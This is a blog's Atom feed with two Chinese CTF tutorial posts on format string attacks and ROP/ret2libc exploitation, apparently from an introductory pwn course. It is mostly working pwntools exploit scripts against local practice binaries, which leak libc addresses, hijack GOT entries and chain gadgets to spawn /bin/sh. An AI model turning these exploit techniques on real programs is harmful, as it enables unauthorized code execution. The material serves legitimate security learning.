<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lhaihai&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.Lhaihai.wang/"/>
  <updated>2018-08-24T12:35:18.556Z</updated>
  <id>http://blog.Lhaihai.wang/</id>
  
  <author>
    <name>Lhaihai</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Format_String_Attack</title>
    <link href="http://blog.Lhaihai.wang/2018/08/24/Format-String-Attack/"/>
    <id>http://blog.Lhaihai.wang/2018/08/24/Format-String-Attack/</id>
    <published>2018-08-24T12:22:43.000Z</published>
    <updated>2018-08-24T12:35:18.556Z</updated>
    
    <content type="html"><![CDATA[<p>蓝鲸安全PWN入门课程</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是%，直接输出到相应标准输出。</li><li>当前字符是%， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是%,输出%</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113474705.png" alt="1535113474705"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113483396.png" alt="1535113483396"></p><h3 id="Read-from-arbitrary-memory"><a href="#Read-from-arbitrary-memory" class="headerlink" title="Read from arbitrary memory"></a>Read from arbitrary memory</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113523330.png" alt="1535113523330"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113536659.png" alt="1535113536659"></p><h3 id="Write-to-arbitrary-memory"><a href="#Write-to-arbitrary-memory" class="headerlink" title="Write to arbitrary memory"></a>Write to arbitrary memory</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113572090.png" alt="1535113572090"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113588123.png" alt="1535113588123"></p><h3 id="Got-Hijacking"><a href="#Got-Hijacking" class="headerlink" title="Got Hijacking"></a>Got Hijacking</h3><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113771598.png" alt="1535113771598"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Format-String-Attack.assets/1535113788338.png" alt="1535113788338"></p><h3 id="格式化字符串综合利用"><a href="#格式化字符串综合利用" class="headerlink" title="格式化字符串综合利用"></a>格式化字符串综合利用</h3><ul><li>==可以使用任意地址读取，获取当前函数的实际地址，从而可以获取libc基地址==</li><li>==利用libc基地址+偏移地址可以知道其他函数地址==</li><li>==利用任意地址写入，从而配合got hijacking更改已有函数地址==</li></ul><h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">conn.sendline(p32(password_addr)+<span class="string">'#'</span>+<span class="string">'%10$s'</span>+<span class="string">'#'</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">pwd = u32(conn.recvuntil(<span class="string">'#'</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> pwd</span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(str(pwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x804a02c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(fmtstr_payload(<span class="number">7</span>,&#123;x_addr:<span class="number">339117970</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="fmt1"><a href="#fmt1" class="headerlink" title="fmt1"></a>fmt1</h3><p>向原来printf的got地址写入system的实际地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fmt1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">got_libc_start_main = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">off_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_libc_start_main:'</span>+ hex(got_libc_start_main)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'off_libc_start_main:'</span>+ hex(off_libc_start_main)</span><br><span class="line"></span><br><span class="line">payload1 = p32(got_libc_start_main) +<span class="string">'#'</span> + <span class="string">'%5$s'</span> +<span class="string">'#'</span></span><br><span class="line"></span><br><span class="line">conn.sendline(payload1)</span><br><span class="line">conn.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">libc_main_real = u32(conn.recvuntil(<span class="string">'#'</span>)[:<span class="number">4</span>])</span><br><span class="line">libc_base = libc_main_real - off_libc_start_main</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base:'</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(fmtstr_payload(<span class="number">5</span>,&#123;printf_got:system&#125;))</span><br><span class="line">raw_input(<span class="string">'#'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;蓝鲸安全PWN入门课程&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ROP入门</title>
    <link href="http://blog.Lhaihai.wang/2018/08/24/ROP%E5%85%A5%E9%97%A8/"/>
    <id>http://blog.Lhaihai.wang/2018/08/24/ROP入门/</id>
    <published>2018-08-23T17:14:04.000Z</published>
    <updated>2018-08-24T13:30:01.293Z</updated>
    
    <content type="html"><![CDATA[<p>蓝鲸安全的PWN入门课程</p><a id="more"></a><h2 id="Rop-一"><a href="#Rop-一" class="headerlink" title="Rop(一)"></a>Rop(一)</h2><p>查找ROP</p><p>ROPGadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./shellcode</span><br><span class="line">ROPgadget --binary shellcode --opcode cd80c3</span><br><span class="line">cd80c3 //int 0x80 ; ret</span><br></pre></td></tr></table></figure><p>查找可以写入的代码段</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848989362.png" alt="1534848989362"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848975573.png" alt="1534848975573"></p><p>查找int 80 ，发现没有 int 80 ； ret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen$ ROPgadget --binary ./rop --opcode cd80c3</span><br><span class="line">Opcodes information</span><br><span class="line">============================================================</span><br><span class="line">0x0806ef00 : cd80c3</span><br></pre></td></tr></table></figure><table><thead><tr><th><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="noopener">sys_read</a></th><th>0x03</th><th>unsigned int fd</th><th>char __user *buf</th><th>size_t count</th></tr></thead><tbody><tr><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener"> sys_execve</a></td><td>0x0b</td><td>char __user *</td><td>char <strong>user *</strong>user *</td><td>char <strong>user *</strong>user *</td></tr></tbody></table><h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080595b3</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e7da</span></span><br><span class="line">buf = <span class="number">0x080ee000</span> - <span class="number">100</span></span><br><span class="line">int_80_ret = <span class="number">0x0806ef00</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">0x03</span>,</span><br><span class="line">pop_ebx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pop_ecx_ret,</span><br><span class="line">buf,</span><br><span class="line">pop_edx_ret,</span><br><span class="line"><span class="number">50</span>,</span><br><span class="line">int_80_ret,</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">0x0b</span>,</span><br><span class="line">pop_ebx_ret,</span><br><span class="line">buf,</span><br><span class="line">pop_ecx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pop_edx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">int_80_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">22</span>+flat(rop)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x080eb000</span><span class="number">-100</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806eef0</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">0x03</span>,</span><br><span class="line">pop_edx_ecx_ebx_ret,</span><br><span class="line"><span class="number">50</span>,</span><br><span class="line">buf,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">int_0x80_ret,</span><br><span class="line">pop_eax_ret,</span><br><span class="line"><span class="number">0x0b</span>,</span><br><span class="line">pop_edx_ecx_ebx_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">buf,</span><br><span class="line">int_0x80_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + flat(rop)</span><br><span class="line"></span><br><span class="line">r = conn.recvline()</span><br><span class="line"></span><br><span class="line">r = conn.recvuntil(<span class="string">'Your input :'</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>ROP：<a href="https://speakerdeck.com/l4ys/rop-qing-song-tan" target="_blank" rel="noopener">ROP轻松谈</a> </p><h2 id="ROP（二）"><a href="#ROP（二）" class="headerlink" title="ROP（二）"></a>ROP（二）</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep puts@</span><br><span class="line">   203: 00064da0   421 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.0</span><br><span class="line">   430: 00064da0   421 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.0</span><br><span class="line">  1173: 00063830   325 FUNC    WEAK   DEFAULT   12 fputs@@GLIBC_2.0</span><br><span class="line">  1723: 00063830   325 FUNC    GLOBAL DEFAULT   12 _IO_fputs@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep gets@</span><br><span class="line">    96: 00064440   365 FUNC    WEAK   DEFAULT   12 gets@@GLIBC_2.0</span><br><span class="line">   800: 000632a0   354 FUNC    WEAK   DEFAULT   12 fgets@@GLIBC_2.0</span><br><span class="line">  1374: 000632a0   354 FUNC    GLOBAL DEFAULT   12 _IO_fgets@@GLIBC_2.0</span><br><span class="line">  1799: 0002ce40   204 FUNC    GLOBAL DEFAULT   12 catgets@@GLIBC_2.0</span><br><span class="line">  2249: 00064440   365 FUNC    GLOBAL DEFAULT   12 _IO_gets@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep system@</span><br><span class="line">   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">puts_got_plt = <span class="number">0x0804a01c</span></span><br><span class="line">puts_off = <span class="number">0x0064da0</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">conn.sendline(str(puts_got_plt))</span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">libc_base = int(conn.recvuntil(<span class="string">'\n'</span>).strip(),<span class="number">16</span>) - puts_off</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets = libc_base + <span class="number">0x00064440</span></span><br><span class="line">system = libc_base + <span class="number">0x0003fe70</span></span><br><span class="line">buf = <span class="number">0x0804b000</span> - <span class="number">30</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">gets,</span><br><span class="line">system,</span><br><span class="line">buf,</span><br><span class="line">buf,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">60</span>+flat(rop))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">raw_input(<span class="string">'#'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ objdump -d -j .plt ./pwnme</span><br><span class="line"></span><br><span class="line">./pwnme:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048320 &lt;read@plt-0x10&gt;:</span><br><span class="line"> 8048320:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048326:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804832c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048330 &lt;read@plt&gt;:</span><br><span class="line"> 8048330:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048336:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804833b:e9 e0 ff ff ff       jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048340 &lt;alarm@plt&gt;:</span><br><span class="line"> 8048340:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048346:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804834b:e9 d0 ff ff ff       jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048350 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 8048350:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048356:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804835b:e9 c0 ff ff ff       jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048360 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048360:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 8048366:68 18 00 00 00       push   $0x18</span><br><span class="line"> 804836b:e9 b0 ff ff ff       jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048370 &lt;write@plt&gt;:</span><br><span class="line"> 8048370:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 8048376:68 20 00 00 00       push   $0x20</span><br><span class="line"> 804837b:e9 a0 ff ff ff       jmp    8048320 &lt;read@plt-0x10&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5s *0x804a018</span><br><span class="line">0xf7e2c9e0:&quot;UWVS\350\&quot;\241\020&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep main@</span><br><span class="line">  1776: 0002b8d0   296 FUNC    WEAK   DEFAULT   12 textdomain@@GLIBC_2.0</span><br><span class="line">  2200: 000280f0    50 FUNC    WEAK   DEFAULT   12 bindtextdomain@@GLIBC_2.0</span><br><span class="line">  2262: 000199e0   454 FUNC    GLOBAL DEFAULT   12 __libc_start_main@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep gets@</span><br><span class="line">    96: 00064440   365 FUNC    WEAK   DEFAULT   12 gets@@GLIBC_2.0</span><br><span class="line">   800: 000632a0   354 FUNC    WEAK   DEFAULT   12 fgets@@GLIBC_2.0</span><br><span class="line">  1374: 000632a0   354 FUNC    GLOBAL DEFAULT   12 _IO_fgets@@GLIBC_2.0</span><br><span class="line">  1799: 0002ce40   204 FUNC    GLOBAL DEFAULT   12 catgets@@GLIBC_2.0</span><br><span class="line">  2249: 00064440   365 FUNC    GLOBAL DEFAULT   12 _IO_gets@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep system@</span><br><span class="line">   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./pwnme'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = p.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = p.got[<span class="string">'write'</span>]</span><br><span class="line">read = p.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">write_off = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0xf66ee900</span> - write_off</span><br><span class="line"><span class="comment">#0xf6615000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base'</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">gets_off = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets = libc_base + gets_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'gets'</span>+hex(gets)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system'</span>+hex(system)</span><br><span class="line">buf = <span class="number">0x0804b000</span> <span class="number">-100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop1 = p32(plt_write)+p32(0x804847d)+p32(1)+p32(got_write)+p32(4)+p32(0x804847d)</span></span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">gets,</span><br><span class="line">system,</span><br><span 